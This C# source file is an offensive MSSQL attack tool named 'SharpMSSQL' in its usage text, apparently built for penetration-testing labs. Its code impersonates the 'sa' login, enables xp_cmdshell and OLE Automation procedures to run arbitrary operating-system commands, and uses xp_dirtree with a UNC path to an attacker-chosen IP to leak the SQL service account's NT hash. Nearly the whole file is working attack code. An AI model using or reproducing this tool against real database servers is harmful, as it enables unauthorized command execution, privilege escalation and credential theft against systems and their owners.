using System;
using System.Data.SqlClient;
using System.Runtime.Remoting.Messaging;

namespace SQL
{
    class Program
    {
        static bool check_xp_cmdshell(SqlConnection con)
        {
            try
            {
                // Check if the user has EXECUTE permissions on xp_cmdshell
                SqlCommand checkPermissionsCommand = new SqlCommand("IF HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') = 1 BEGIN SELECT 1 END ELSE BEGIN SELECT 0 END", con);
                int result = (int)checkPermissionsCommand.ExecuteScalar();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Hooray! You can execute xp_cmdshell!");
                Console.ResetColor();
                return result == 1;
            }
            catch (SqlException ex)
            {
                Console.WriteLine("Error checking xp_cmdshell permissions: " + ex.Message);
                return false;
            }
        }


        static void ole_cmd(SqlConnection con, string cmd)
        {

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            String execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";


            SqlCommand command = new SqlCommand(enable_ole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            
        }

        static void xp_cmdshell(SqlConnection con, string cmd)
        {
            try
            {
                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                SqlCommand command = new SqlCommand(enable_xpcmd, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Looks like you cant reconfigure server and enable xp_cmdshell...");
                Console.ResetColor();
                Console.WriteLine("But we will try anyway!");
            }
            finally
            {
                String execCmd = $"EXEC xp_cmdshell '{cmd}'";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();
                Console.WriteLine("Result of command is: ");
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }

                reader.Close();
            }
        }


        static bool impersonation(SqlConnection con)
        {
            String executeas = "EXECUTE AS LOGIN = 'sa';";
            try
            {
                SqlCommand command = new SqlCommand(executeas, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Logged in as: " + reader[0]);
                Console.ResetColor();
                reader.Close();
                return true;
            }
            catch (SqlException ex)
            {
                if (ex.Number == 15517)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Niestety nie mozesz sie logowac jako sa");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: " + ex.Message);
                    Console.ResetColor();
                }
                return false;
            }   
 
        }

        static bool check_imperonated_logins(SqlConnection con)
        {
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            if (reader.HasRows){
                while (reader.Read() == true){
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                }
                reader.Close();
                return true;
            }
            else
            {
                Console.WriteLine("No accounts can be impersonated");
                reader.Close();
                return false;
            }
        }

        // Check role assignment
        static void check_role(SqlConnection con, string roleName)
        {
            
            String querypublicrole = $"SELECT IS_SRVROLEMEMBER('{roleName}');";
            SqlCommand command = new SqlCommand(querypublicrole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"User is a member of {roleName} role");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"User is NOT a member of {roleName} role");
                Console.ResetColor();
            }
            reader.Close();
        }

        // Check basic info
        static void enum_current_user(SqlConnection con)
        {
            // Check Who is logged in
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            check_role(con, "public");
            check_role(con, "sysadmin");
            if (check_imperonated_logins(con))
            {
                Console.WriteLine("Some logins to impersonate found ... trying to impersonate sa ... ");
                impersonation(con);
            }
            
 
        }

        // Send nt hash of sql service to given IP address
        static void get_svchash(SqlConnection con, string srvIP)
        {
            String query = $"EXEC master..xp_dirtree \"\\\\{srvIP}\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }



        static void DisplayUsage()
        {
            Console.WriteLine("Usage: SharpMSSQL <sqlServer> <dbName> <operation> <hashServer>");
            Console.WriteLine("Arguments:");
            Console.WriteLine("  <sqlServer>    SQL Server name (required)");
            Console.WriteLine("  <dbName>       Database name (required)");
            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash', 'cmd'");
            Console.WriteLine("  gethash <hashServer>   Server to send svc hash (probably your Kali Linux'");
            Console.WriteLine("  xp_cmd <command>   Command to be executed using xp_cmdshell");
            Console.WriteLine("  ole_cmd <command>   Command to be executed using OLE");
        }


        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                DisplayUsage();
                return;
            }

            string sqlServer = args[0];
            string database = args[1];
            string operation = args[2];


            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            switch (operation.ToLower())
            {
                case "enum":
                    enum_current_user(con);
                    con.Close();
                    break;
                case "gethash":
                    if (args.Length < 4)
                    {
                        Console.WriteLine("Error: Missing argument. For 'gethash' operation, provide a IP address to send hash.");
                        DisplayUsage();
                        return;
                    }
                    get_svchash(con, args[3]);
                    con.Close();
                    break;
                case "xp_cmd":
                    if (args.Length < 4)
                    {
                        Console.WriteLine("Error: Missing argument. For 'xp_cmd' operation, provide a command to execute.");
                        DisplayUsage();
                        return;
                    }
                    if (impersonation(con))
                    {
                        Console.WriteLine("Trying to execute command with xp_cmdshell as sa ...");
                        xp_cmdshell(con, args[3]);
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Unfortunately you cant impersonate sa.");
                        Console.ResetColor();
                        Console.WriteLine("Trying again with user permissions ...");
                        if (check_xp_cmdshell(con))
                        {
                            Console.WriteLine("Trying to execute command with xp_cmdshell ...");
                            xp_cmdshell(con, args[3]);
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Unfortunately you cant execute xp_cmdshell.");
                            Console.ResetColor();
                        }
                    }
                    con.Close();
                    break;
                case "ole_cmd":
                    if (args.Length < 4)
                    {
                        Console.WriteLine("Error: Missing argument. For 'ole_cmd' operation, provide a command to execute.");
                        DisplayUsage();
                        return;
                    }
                    if (impersonation(con))
                    {
                        Console.WriteLine("Trying to execute command with ole_cmdshell ...");
                        ole_cmd(con, args[3]);
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Unfortunately you cant impersonate sa.");
                        Console.ResetColor();
                    }
                    con.Close();
                    break;
                default:
                    Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash', 'cmd'");
                    DisplayUsage();
                    break;
            }

            con.Close();
        }
    }
}